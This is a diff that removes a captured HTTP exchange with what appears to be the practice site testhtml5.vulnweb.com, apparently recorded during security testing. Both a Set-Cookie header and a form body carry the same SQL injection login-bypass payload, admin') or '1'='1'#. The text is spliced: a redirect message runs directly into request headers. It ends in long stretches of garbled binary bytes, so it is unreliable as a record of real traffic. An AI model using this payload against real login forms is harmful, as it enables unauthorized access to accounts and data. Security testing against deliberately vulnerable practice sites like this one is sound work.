@@ -1,20 +1,0 @@
-HTTP/1.1 302 FOUND
-Server: nginx/1.19.0
-Date: Sat, 18 Mar 2023 04:08:23 GMT
-Content-Type: text/html; charset=utf-8
-Content-Length: 265
-Connection: keep-alive
-Location: http://testhtml5.vulnweb.com/
-Set-Cookie: username="admin') or '1'='1'#"; Path=/
-
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
-<title>Redirecting...</title>
-<h1>Redirecting...</h1>
-<p>You should be redirected automatically to target URL: <a href="http://testhtml5.vulnweb.com/">http://testhtml5.vulnweb.com/</a>.  If not click the link.vulnweb.com/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-
-username=admin%27%29+or+%271%27%3D%271%27%23&password=1234?(·M`ş£îÓ(„6Å@v,K:Ûæ%±IW’ß•¸¾m‰—n	 {Yveïâ§¿‘å»‹n‘¦É©8¦¼³õó1çySÉZV›¶¬œÂûÖ¼“G$1«Ë—ìv&Ş°¯:8j˜
-ºøi‡Ğ¤šò*©Ô×TH#HÑ³l$ÿl¸1÷©×"È¨Ù\Cû|Xß€Ş–ò`ıé(^óÏô>;»í"lp<õ¿7‚Àë\Åé“UƒÈ©éÁi‹tïÀÙ§¿N†½?û‡=yÚd¶æyŒòá¸QjÃWıç¢?S“-£E]éŒt5©ÑÑ˜LÏdDi>š~9éºWÔ&}ÊĞ.œÇO7¥dõ§è° ­oYşŠvÈé±ûwxıqql­í ÃYè¡p*Lµç40Y~Od}İÁoziD#/·-¶ÈO
-"{\ˆ¼#1‘	 *†ù|98ÅÉ°à‡h¸İ-ıª¦LıXóy›­,ç£h´®:ZEŞS8¨ßBÔSÔëA…şvéh†¾u~¥^t)°
-Ïéi¢X,Ø„Md‘\æ„™ZĞq¸¥RôÔšWÄoàÕc°ä¤vn4DÊ*(zïr~ôKÁ/JÄ-öàWäÅuîe"ìÒ!IÇW\;àÿ¹§ÚÑK Ñ Tˆeğœ</iD@ëÔB£$ß¼ö<ÉPÖPşTŞ'øÈ3<ŞúlõÕL
